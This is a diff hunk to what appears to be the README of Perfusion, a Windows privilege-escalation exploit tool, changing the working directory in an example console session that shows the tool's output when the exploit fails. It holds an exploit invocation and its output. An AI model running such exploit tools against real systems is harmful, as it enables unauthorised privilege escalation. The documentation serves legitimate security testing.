@@ -44,7 +44,7 @@ C:\Temp>
 :x: Here is what you should see when the exploit fails:
 
 ```console
-C:\Users\Lab-User\Desktop\workspace>Perfusion.exe -c cmd -i
+C:\Temp>Perfusion.exe -c cmd -i
 [*] Created Performance DLL: C:\Users\Lab-User\AppData\Local\Temp\performance_636_3000_1.dll
 [*] Created Performance registry key.
 [*] Triggered Performance data collection.
